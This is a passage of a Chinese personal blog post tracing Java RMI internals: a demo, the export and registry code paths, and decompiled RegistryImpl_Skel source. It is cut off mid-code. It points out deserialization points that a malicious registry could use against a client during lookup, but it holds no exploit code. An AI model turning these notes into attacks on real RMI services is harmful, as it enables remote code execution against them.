<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>关于Rmi | 5LHBr's Blog</title><meta name="author" content="5LHBr"><meta name="copyright" content="5LHBr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[TOC] 最近几天一真在看rmi的一些东西，想着记录下来也让自己的记得更深一点 个人能力有限，记录下来也是为了让自己忘得慢一点，看见写的不好地方就当图一乐。 那么我们开始吧。 1、什么是rmiRMI (Remote Method Invocation) 远程方法调用，顾名思义远程方法调用。在java中如果想要调用远程方法通常使用java原生反序列化，并且结合动态类加载和安全管理器来传输一个完整的">
<meta property="og:type" content="article">
<meta property="og:title" content="关于Rmi">
<meta property="og:url" content="http://example.com/2023/07/30/%E5%85%B3%E4%BA%8ERmi/index.html">
<meta property="og:site_name" content="5LHBr&#39;s Blog">
<meta property="og:description" content="[TOC] 最近几天一真在看rmi的一些东西，想着记录下来也让自己的记得更深一点 个人能力有限，记录下来也是为了让自己忘得慢一点，看见写的不好地方就当图一乐。 那么我们开始吧。 1、什么是rmiRMI (Remote Method Invocation) 远程方法调用，顾名思义远程方法调用。在java中如果想要调用远程方法通常使用java原生反序列化，并且结合动态类加载和安全管理器来传输一个完整的">
<meta property="og:locale">
<meta property="og:image" content="https://5lhbr.github.io/images/20230730161128.jpg">
<meta property="article:published_time" content="2023-07-30T08:55:50.000Z">
<meta property="article:modified_time" content="2023-08-23T14:10:01.749Z">
<meta property="article:author" content="5LHBr">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://5lhbr.github.io/images/20230730161128.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/07/30/%E5%85%B3%E4%BA%8ERmi/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '关于Rmi',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-23 22:10:01'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="5LHBr's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://5lhbr.github.io/images/20230730161128.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="5LHBr's Blog"><span class="site-name">5LHBr's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">关于Rmi</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-07-30T08:55:50.000Z" title="Created 2023-07-30 16:55:50">2023-07-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-08-23T14:10:01.749Z" title="Updated 2023-08-23 22:10:01">2023-08-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="关于Rmi"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>[TOC]</p>
<p>最近几天一真在看rmi的一些东西，想着记录下来也让自己的记得更深一点</p>
<p>个人能力有限，记录下来也是为了让自己忘得慢一点，看见写的不好地方就当图一乐。</p>
<p>那么我们开始吧。</p>
<h3 id="1、什么是rmi"><a href="#1、什么是rmi" class="headerlink" title="1、什么是rmi"></a>1、什么是rmi</h3><p>RMI (Remote Method Invocation) 远程方法调用，顾名思义远程方法调用。在java中如果想要调用远程方法通常使用java原生反序列化，并且结合动态类加载和安全管理器来传输一个完整的java类。</p>
<p>那么RMI是怎么实现的呢。</p>
<p>RMI 中有三个重要的角色：注册中心（Registry）、客户端（Client）、服务端（Server）。</p>
<p>在rmi中需要先进行服务注册，客户端从注册中心获取服务，服务端向注册中心注册远程对象。为了屏蔽网络通讯的复杂性，rmi提出了（stub）客户端存根和(Skeleton)服务端骨架两个概念，客户端和服务端的网络通讯都通过stub和skeleton进行。文字一大堆不如一个图，偷一个 。如下图：<img src="/images/image-20230730173140687.png" alt="image-20230730173140687"></p>
<h4 id="1-1、先写一个demo来简单了解一下整个流程"><a href="#1-1、先写一个demo来简单了解一下整个流程" class="headerlink" title="1.1、先写一个demo来简单了解一下整个流程"></a>1.1、先写一个demo来简单了解一下整个流程</h4><p>想要使用rmi服务首先要定义一个远程调用的接口，这个接口必须拓展<code>java.rmi.Remote</code>接口,用来远程调用的对象作为这个接口的实例，也将实现这个接口，为这个接口生成的代理（Stub）也是如此。</p>
<p><img src="/images/image-20230730174511263.png" alt="image-20230730174511263"></p>
<p>下面我们来写我们真正要远程调用的实现类<code>RemoteObjImpl</code>，这里是真正实现代码逻辑的地方，这里一般会扩展<code>java.rmi.server.UnicastRemoteObject</code> 类，扩展此类后，RMI 会自动将这个类 export 给远程想要调用它的 Client 端，同时还提供了一些基础的 <code>equals/hashcode/toString</code> 方法。这里必须为这个实现类提供一个构造函数并且抛出 RemoteException。</p>
<p><img src="/images/image-20230730174716331.png" alt="image-20230730174716331"></p>
<p>然后我们将实现类绑定到注册中心上，注册中心由<code>java.rmi.registry</code>实现，代码实现如下</p>
<p><img src="/images/image-20230730175336654.png" alt="image-20230730175336654"></p>
<p>现在我们已经将实现类绑定到registry上了，下面我们就应该在客户端去调用远程对象。代码如下，具体的代码干什么的我就都不再赘述了。</p>
<p><img src="/images/image-20230730181611802.png" alt="image-20230730181611802"></p>
<p>运行结果</p>
<p><img src="/images/image-20230730181707227.png" alt="image-20230730181707227"></p>
<p>这样一次简单的远程调用通信就完成了。</p>
<h3 id="2、源码分析"><a href="#2、源码分析" class="headerlink" title="2、源码分析"></a>2、源码分析</h3><p>下面我们对流程进行具体的分析</p>
<h4 id="2-1-服务注册"><a href="#2-1-服务注册" class="headerlink" title="2.1.服务注册"></a>2.1.服务注册</h4><h5 id="①-远程对象创建"><a href="#①-远程对象创建" class="headerlink" title="① 远程对象创建"></a>① 远程对象创建</h5><p>我们创建了一个远程对象<code>RemoteObjImpl remoteObj = new RemoteObjImpl();</code>这个对象继承了 UnicastRemoteObject，这个类用于使用 JRMP 协议 export 远程对象，并获取与远程对象进行通信的 Stub。让我们具体的跟一些流程。（这里我用的jdk版本1.8.65）</p>
<p>在初始化时，会创建一个 UnicastServerRef 对象，并调用其 <code>exportObject</code> 方法来 export RemoteObject 这个远程对象。</p>
<p><img src="/images/image-20230730191023654.png" alt="image-20230730191023654"></p>
<p><img src="/images/image-20230730191104038.png" alt="image-20230730191104038"></p>
<p>下面我们跟进去康康<code>UnicastServerRef</code>是什么根据描述</p>
<p><img src="/images/image-20230730191535118.png" alt="image-20230730191535118"></p>
<p>应该只是确定端口的一个封装。跳出来跟进<code>UnicastRemoteObject</code>中的exportObject,此时传入的是一个封装好的unicastServerRef，封装有LiveRef对象，在LiveRef里又有封装好的TCPEndpoint</p>
<p><img src="/images/image-20230730192252538.png" alt="image-20230730192252538"></p>
<p>赋完值后又调用<code>UnicastServerRef.exportObject</code></p>
<p>走到exportObject里面又调用<code>createProxy</code></p>
<p><img src="/images/image-20230730192721545.png" alt="image-20230730192721545"></p>
<p>这其中使用 <code>sun.rmi.server.Util#createProxy()</code> 方法使用 RemoteObjectInvocationHandler 来为我们产生写的 RemoteObject 实现的 RemoteInterface 接口创建动态代理。</p>
<p><img src="/images/image-20230730193823195.png" alt="image-20230730193823195"></p>
<p>然后起了一个线程。</p>
<p><img src="/images/image-20230730194005582.png" alt="image-20230730194005582"></p>
<p>然后创建 <code>sun.rmi.transport.Target</code> 对象，用 Target 对象封装了我们远程执行方法和生成的动态代理类（Stub）。<code>Target可以理解为是一个远程服务实例，一个Target对应一个远程对象。里面保存了远程对象实例、对应的Stub、对应的远程引用对象UnicastServerRef，之前创建的LiveRef的ObjID。实际上Target就是用LiveRef的ObjID代表了这个远程对象，一个远程对象和一个LiveRef是绑定的。这里就包括了远程调用所需的全部对象了，远程调用就是Stub使用远程引用来调用远程对象上的方法。</code></p>
<p><img src="/images/image-20230730194156907.png" alt="image-20230730194156907"></p>
<p>这里一直在封装我们的ref。然后调用 <code>LiveRef#exportObject</code> 接着调用 <code>sun.rmi.transport.tcp.TCPEndpoint#exportObject</code> 监听本地端口。</p>
<p><img src="/images/image-20230730210204417.png" alt="image-20230730210204417"></p>
<p><img src="/images/image-20230730210147653.png" alt="image-20230730210147653"></p>
<p>现在已经获得端口了，现在回到<code>TCPTransport.exportObject</code>继续执行，会执行TCPTransport 的 exportObject 方法</p>
<p><img src="/images/image-20230730210506328.png" alt="image-20230730210506328"></p>
<p>LiveRef、TCPEndoPint、TCPTransport是处理网络通信的类。UnicastRef、UnicastServerRef是远程对象的引用对象，是宏观上处理网络请求的类，也是实现RMI调用的核心逻辑的类。UnicastRemoteObject就是远程对象的基础类，它并不直接处理网络请求，而是通过里面的UnicastServerRef处理。</p>
<p>将 Target 实例注册到 ObjectTable 中。ObjectTable 用来管理所有发布的服务实例 Target，ObjectTable 提供了根据 ObjectEndpoint 和 Remote 实例两种方式查找 Target 的方法（不同参数的 getTarget 方法）。</p>
<p><img src="/images/image-20230730210702811.png" alt="image-20230730210702811"></p>
<p>上述的流程可以大致简单总结成一张图</p>
<p><img src="/images/image-20230730210744659.png" alt="image-20230730210744659"></p>
<p>这就是整个的远程对象RemoteObjImpl的创建过程，中间比较乱的地方是创建了一大堆对象，互相包含又互相引用。大概描述一下：<br>最外层对象是Target，里面保存了远程对象、远程对象的代理对象stub、远程对象的引用对象UnicastServerRef、还有代表这个对象的ObjID。<br>而远程对象里也保存了服务端远程引用对象UnicastServerRef，stub里保存了一个客户端远程引用UnicastRef，这两个引用里实际都保存了同一个LiveRef对象，里面保存了远程对象对应的ip和端口。<br>而服务端上还有一个ObjectTable，每创建一个远程对象，就会把对应的Target保存到里面。目前已经创建了两个远程对象，分别是自定义远程对象和系统内置远程对象DGCImpl。</p>
<h5 id="②远程对象创建"><a href="#②远程对象创建" class="headerlink" title="②远程对象创建"></a>②远程对象创建</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>七拐八拐到了unicastServerRef中，这里我们似曾相识，前面都是一样的，只是端口不一样，这里会进入setSkeleton中<img src="/images/image-20230730231021224.png" alt="image-20230730231021224"></p>
<p>进入了util的createSkeleton</p>
<p><img src="/images/image-20230730231924849.png" alt="image-20230730231924849"></p>
<p>反射生成了sun.rmi.registry.RegistryImpl_Skel，接下来和之前一样了，创建Target然后发布。最后把Target放到ObjectTable里面，目前里面有RemoteObjImpl的Stub和RegistryImpl_Stub，还有个DGCImpl_Stub。</p>
<p>这里忽略了DGCImpl_Stub.，在创建完target后又调用liveRef.exportObject。里面调用了一系列的exportObject</p>
<p><img src="/images/image-20230730232540105.png" alt="image-20230730232540105"></p>
<p>在将把对象和target绑定，放进ObjectTable这个类的静态变量objTable里面。的方法中调用触发了DGCImpl类的实例化。这是垃圾回收相关的类，跟进static代码块</p>
<p>发现和我们之前的调用过程的类似的</p>
<p><img src="/images/image-20230730232825798.png" alt="image-20230730232825798"></p>
<p>使用单例模式创建了一个DGCImpl对象，这个对象就是RMI的分布式垃圾处理对象，一旦有远程对象被创建，就会实例化这个对象，但也只会创建这一次。后面的代码和UnicastServerRef#exportObject里很像，创建一个代理。但这里和前面不同的是这是一个系统内置类，所以是直接创建了DGCImpl_Stub类，而不是创建的动态代理。并且设置了disp的skeleton是DGCImpl_Skel。最后同样把这些放进Target，把Target保存进ObjectTable。</p>
<h5 id="③绑定远程对象到注册中心"><a href="#③绑定远程对象到注册中心" class="headerlink" title="③绑定远程对象到注册中心"></a>③绑定远程对象到注册中心</h5><p>好了下面让我们康康怎么绑定远程对象到注册中心</p>
<p><img src="/images/image-20230730233215562.png" alt="image-20230730233215562"></p>
<p>把名字和对象放在一个bindings里面，就完了。</p>
<h4 id="2-2、客户端获取远程"><a href="#2-2、客户端获取远程" class="headerlink" title="2.2、客户端获取远程"></a>2.2、客户端获取远程</h4><h5 id="1-获取注册中心远程对象"><a href="#1-获取注册中心远程对象" class="headerlink" title="1.获取注册中心远程对象"></a>1.获取注册中心远程对象</h5><p>下面开始客户端获取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span><br></pre></td></tr></table></figure>

<p>通过host和端口创建了一个LiveRef</p>
<p><img src="/images/image-20230731222923822.png" alt="image-20230731222923822"></p>
<p>然后用LiveRef创建了一个UnicastRef，最后调用了Util.createProxy根据前面分析这里创建的是一个RegistryImpl_Stub对象。和服务端不同的是这里的ref是一个UnicastRef而不是UnicastServerRef，因为一个对应客户端一个对应服务端。最后创建了这个RegistryImpl_Stub对象，接下来通过它去查找注册中心中的远程对象。</p>
<p>然后</p>
<p><code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code></p>
<p>先进入newCall发起一个请求和注册中心建立连接。</p>
<p><img src="/images/image-20230731224003512.png" alt="image-20230731224003512"></p>
<p>然后调用UnicastRef#invoke</p>
<p><img src="/images/image-20230731224438359.png" alt="image-20230731224438359"></p>
<p>然后进入StreamRemoteCall#executeCall</p>
<p>executeCall作用是发起网络调用，和服务端进行通信并获取结果，执行executeCall此时也触发了服务端监听线程的run方法，需要注意的是当服务端返回异常时，会对输入流调用readObject</p>
<p><img src="/images/image-20230731225800649.png" alt="image-20230731225800649"></p>
<p>现在正常的我们往下走，出来之后又是一个反序列化点，</p>
<p><img src="/images/image-20230731225957678.png" alt="image-20230731225957678"></p>
<p>对我们从正常中心获取的数据流进行反序列化，如果我们控制注册中心返回恶意数据流，那么如果注册中心可控，客户端lookup注册中心的时候就会被攻击。</p>
<h4 id="2-3、获取注册中心远程对象-注册中心端"><a href="#2-3、获取注册中心远程对象-注册中心端" class="headerlink" title="2.3、获取注册中心远程对象(注册中心端)"></a>2.3、获取注册中心远程对象(注册中心端)</h4><p>之前有提到，在发布远程对象的时候存在一个线程AcceptLoop线程，我们打上断点，看见会跑到断点位置。</p>
<p><img src="/images/image-20230820194602673.png" alt="image-20230820194602673"></p>
<p>调用TCPTransport#executeAcceptLoop，会开启新线程，跟进ConnectionHandler#run<img src="/images/image-20230820194638977.png" alt="image-20230820194638977"></p>
<p>进入run0，这里一大堆处理，我们直接看关键的地方handleMessages，跟进去</p>
<p><img src="/images/image-20230820194845850.png" alt="image-20230820194845850"></p>
<p>根据读取的op不同进行不同的操作，一般就是走进第一个case，跟进serviceCall</p>
<p><img src="/images/image-20230820195459661.png" alt="image-20230820195459661"></p>
<p>读取id，根据id到IbjectTable中查找对应的Target，获取Target中的远程引用disp</p>
<p><img src="/images/image-20230820195523473.png" alt="image-20230820195523473"></p>
<p>调用dispatch，然后进入oldDispatch</p>
<p><img src="/images/image-20230820195806198.png" alt="image-20230820195806198">skel.dispatch，实际上也就是根据Skel的不同调用对应的dispatch方法，那这里就会调用RegistryImpl_Skel#dispatch</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> sun.rmi.registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.rmi.MarshalException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.UnmarshalException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Skeleton;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.SkeletonMismatchException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">RegistryImpl_Skel</span> <span class="keyword">implements</span> <span class="title class_">Skeleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">interfaceHash</span> <span class="operator">=</span> <span class="number">4905912898345647071L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RegistryImpl_Skel</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">            String var7;</span><br><span class="line">            Remote var8;</span><br><span class="line">            ObjectInput var10;</span><br><span class="line">            ObjectInput var11;</span><br><span class="line">            <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var97 = var6.list();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span 